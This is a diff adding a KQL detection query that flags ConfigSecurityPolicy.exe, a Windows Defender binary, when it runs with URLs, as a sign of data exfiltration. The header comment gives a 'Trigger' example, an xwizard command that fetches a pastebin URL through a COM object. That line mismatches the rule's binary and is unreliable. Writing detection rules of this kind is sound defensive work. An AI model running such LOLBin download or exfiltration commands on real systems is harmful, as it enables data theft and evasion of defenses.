@@ -1,0 +1,20 @@
+// Title: Suspicious ConfigSecurityPolicy.exe
+// Desc: Upload file, credentials or data exfiltration with Binary part of Windows Defender
+// Ref - 
+// Ref - https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/
+// MITRE: https://attack.mitre.org/techniques/T1567 (Exfiltration: Exfiltration Over Web Service)
+// Severity: medium
+// Trigger: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM
+// Usecase: Download/Upload file from/to Internet
+// Usecase: Run a com object created in registry to evade defensive counter measures
+// From: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/proc_creation_win_lolbin_configsecuritypolicy.yml
+// By: Frankie Li
+// On: 05-05-2023
+DeviceProcessEvents 
+| where ((ProcessCommandLine contains @'ConfigSecurityPolicy.exe' or FolderPath endswith @'\ConfigSecurityPolicy.exe' 
+    or ProcessVersionInfoOriginalFileName contains  @'ConfigSecurityPolicy.exe' 
+    or InitiatingProcessVersionInfoOriginalFileName contains @'ConfigSecurityPolicy.exe') 
+    and (ProcessCommandLine contains @'https://' or ProcessCommandLine contains @'http://' 
+    or ProcessCommandLine contains @'ftp://'))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessParentFileName, FolderPath, ProcessCommandLine
+
